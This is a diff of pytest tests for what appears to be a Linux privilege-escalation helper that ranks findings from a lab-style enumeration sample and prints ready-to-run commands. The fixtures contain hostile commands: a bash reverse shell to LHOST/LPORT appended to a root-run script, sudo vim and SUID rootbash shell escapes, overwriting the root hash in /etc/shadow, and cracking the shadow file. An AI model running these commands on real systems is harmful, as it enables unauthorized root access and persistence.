@@ -3,6 +3,7 @@
 import os
 import pytest
 
+from core.extractor import extract
 from modules.linux.sudo import analyze as sudo_analyze
 from modules.linux.suid import analyze as suid_analyze
 from modules.linux.capabilities import analyze as caps_analyze
@@ -1177,4 +1178,219 @@ class TestWritableExecScript:
         )
         findings = writable_exec_analyze(text)
         assert len(findings) == 1
-        assert findings[0]["script_path"] == "/srv/startup.sh"
+
+
+# ── core/priority.py + output modes (default / --tldr / --top / --all) ────────
+
+_FOWSNIFF_PATH = os.path.join(os.path.dirname(__file__), "samples", "lp_fowsniff.txt")
+
+
+def _load_fowsniff():
+    with open(_FOWSNIFF_PATH, encoding="utf-8") as fh:
+        return fh.read()
+
+
+class TestPriority:
+    def test_writable_exec_script_primary_is_echo_line(self):
+        from core.priority import get_primary_commands
+        finding = {
+            "type": "writable_exec_script",
+            "commands": [
+                "cat /etc/update-motd.d/* 2>/dev/null | grep -F '/opt/cube/cube.sh'",
+                "grep -r '/opt/cube/cube.sh' /etc/cron* /etc/rc* /etc/init.d/ 2>/dev/null",
+                "# If called by root — append a reverse shell:",
+                "echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> /opt/cube/cube.sh",
+                "# Then trigger by SSHing in or waiting for cron/service restart",
+            ],
+        }
+        primary = get_primary_commands(finding)
+        assert primary == ["echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> /opt/cube/cube.sh"]
+
+    def test_suid_investigation_only_has_no_primary(self):
+        from core.priority import get_primary_commands
+        finding = {
+            "type": "suid",
+            "commands": [
+                "# Unknown SUID binary — investigate manually",
+                "strings /usr/bin/notabin",
+                "ltrace /usr/bin/notabin",
+            ],
+        }
+        assert get_primary_commands(finding) == []
+
+    def test_path_hijack_is_ineligible(self):
+        from core.priority import get_primary_commands
+        finding = {
+            "type": "path_hijack",
+            "commands": ["echo '#!/bin/bash' > /tmp/TARGET_BINARY"],
+        }
+        assert get_primary_commands(finding) == []
+
+    def test_group_is_ineligible(self):
+        from core.priority import get_primary_commands
+        finding = {"type": "group", "commands": ["cat /etc/shadow", "john /etc/shadow"]}
+        assert get_primary_commands(finding) == []
+
+    def test_sudo_primary_is_first_command(self):
+        from core.priority import get_primary_commands
+        finding = {"type": "sudo", "commands": ["sudo vim -c ':!/bin/bash'", "sudo vim -c ':py ...'"]}
+        assert get_primary_commands(finding) == ["sudo vim -c ':!/bin/bash'"]
+
+    def test_capabilities_skips_leading_comment(self):
+        from core.priority import get_primary_commands
+        finding = {
+            "type": "capabilities",
+            "commands": [
+                "# /usr/bin/foo has cap_setuid+ep - manual exploit:",
+                "cp /bin/bash /tmp/rootbash && /usr/bin/foo -c 'chmod +s /tmp/rootbash' && /tmp/rootbash -p",
+            ],
+        }
+        assert get_primary_commands(finding) == [
+            "cp /bin/bash /tmp/rootbash && /usr/bin/foo -c 'chmod +s /tmp/rootbash' && /tmp/rootbash -p"
+        ]
+
+    def test_writable_passwd_shadow_is_ineligible(self):
+        from core.priority import get_primary_commands
+        finding = {
+            "type": "writable_file",
+            "file": "/etc/shadow",
+            "commands": [
+                "grep root /etc/shadow",
+                "cp /etc/shadow /tmp/shadow.bak",
+                "python3 -c \"import crypt; ...\"",
+                "# Copy the hash printed above, then run:",
+                "sed -i 's/^root:[^:]*/root:<PASTE_HASH_HERE>/' /etc/shadow",
+                "su root  # password: password123",
+            ],
+        }
+        assert get_primary_commands(finding) == []
+
+    def test_select_best_prefers_paste_ready_over_investigation_only(self):
+        from core.priority import select_best
+        findings = [
+            {"type": "group", "severity": "CRITICAL", "commands": ["cat /etc/shadow"]},
+            {
+                "type": "writable_exec_script",
+                "severity": "HIGH",
+                "commands": ["echo x"],
+                "primary_command": ["echo x"],
+            },
+        ]
+        best, manual_only = select_best(findings)
+        assert manual_only is False
+        assert best["type"] == "writable_exec_script"
+
+    def test_select_best_falls_back_to_manual_only(self):
+        from core.priority import select_best
+        findings = [
+            {"type": "group", "severity": "HIGH", "commands": ["cat /etc/shadow"], "primary_command": []},
+        ]
+        best, manual_only = select_best(findings)
+        assert manual_only is True
+        assert best["type"] == "group"
+
+    def test_select_best_returns_none_when_nothing_actionable(self):
+        from core.priority import select_best
+        findings = [{"type": "sudo", "severity": "INFO", "commands": [], "primary_command": []}]
+        best, manual_only = select_best(findings)
+        assert best is None
+
+
+class TestExtractorAttachesPrimaryCommand:
+    def test_findings_have_primary_and_other_commands_keys(self):
+        result = extract(_load_fowsniff())
+        for f in result["findings"]:
+            assert "primary_command" in f
+            assert "other_commands" in f
+
+    def test_cube_sh_primary_command_is_echo_line(self):
+        result = extract(_load_fowsniff())
+        cube = next(f for f in result["findings"] if f.get("type") == "writable_exec_script")
+        assert cube["primary_command"] == [
+            "echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> /opt/cube/cube.sh"
+        ]
+
+
+class TestOutputModes:
+    def test_default_mode_shows_only_best_finding(self, capsys):
+        """Best finding is the CRITICAL sudo NOPASSWD vim rule (outranks HIGH cube.sh)."""
+        from output.terminal import print_default
+        result = extract(_load_fowsniff())
+        print_default(result, ip="10.10.10.10", port=4444)
+        out = capsys.readouterr().out
+        assert "sudo -> vim" in out
+        assert "sudo /usr/bin/vim -c ':shell'" in out
+        assert "cube.sh" not in out
+        assert "capabilities" not in out
+        assert "adm" not in out
+        assert "Run with --all to see all 5 findings." in out
+
+    def test_default_mode_lhost_lport_substituted(self, capsys):
+        """cube.sh finding (not the default best) carries LHOST/LPORT; verify substitution via --top."""
+        from output.terminal import print_top
+        result = extract(_load_fowsniff())
+        print_top(result, ip="10.10.10.10", port=4444)
+        out = capsys.readouterr().out
+        assert "10.10.10.10/4444" in out
+        assert "LHOST" not in out
+        assert "LPORT" not in out
+
+    def test_tldr_prints_exactly_expected_command(self, capsys):
+        from output.terminal import print_tldr
+        result = extract(_load_fowsniff())
+        print_tldr(result, ip="10.10.10.10", port=4444)
+        out = capsys.readouterr().out
+        assert out == "sudo /usr/bin/vim -c ':shell'\n"
+
+    def test_top_shows_at_most_three_no_info_no_empty(self, capsys):
+        """--top ranks CRITICAL sudo, CRITICAL suid, then HIGH cube.sh, in that order."""
+        from output.terminal import print_top
+        result = extract(_load_fowsniff())
+        print_top(result, ip="10.10.10.10", port=4444, n=3)
+        out = capsys.readouterr().out
+        assert "INFO" not in out
+        assert out.count("[CRITICAL]") == 2
+        assert out.count("[HIGH]") == 1
+        assert out.index("sudo -> vim") < out.index("suid -> find") < out.index("cube.sh")
+
+    def test_all_mode_reproduces_full_behavior(self, capsys):
+        from output.terminal import print_results
+        result = extract(_load_fowsniff())
+        print_results(result, ip="10.10.10.10", port=4444)
+        out = capsys.readouterr().out
+        assert "Total findings: 5" in out
+        assert "capabilities" in out
+        assert "adm" in out
+        assert "cube.sh" in out
+        assert "sudo -> vim" in out
+        assert "suid -> find" in out
+
+    def test_critical_always_ranks_above_high_in_default_mode(self):
+        """CRITICAL findings (sudo/suid) must always outrank HIGH findings (cube.sh) in select_best."""
+        from core.priority import select_best
+        result = extract(_load_fowsniff())
+        best, manual_only = select_best(result["findings"])
+        assert manual_only is False
+        assert best["severity"] == "CRITICAL"
+        assert best["type"] == "sudo"
+
+    def test_investigation_only_finding_excluded_from_tldr(self, capsys):
+        from output.terminal import print_tldr
+        result = {
+            "os": "linux",
+            "total": 1,
+            "findings": [
+                {
+                    "type": "group",
+                    "severity": "HIGH",
+                    "group": "adm",
+                    "description": "adm group can read system logs",
+                    "commands": ["grep -r password /var/log/"],
+                    "primary_command": [],
+                    "other_commands": ["grep -r password /var/log/"],
+                }
+            ],
+        }
+        print_tldr(result, ip="10.10.10.10", port=4444)
+        out = capsys.readouterr().out
+        assert out == ""
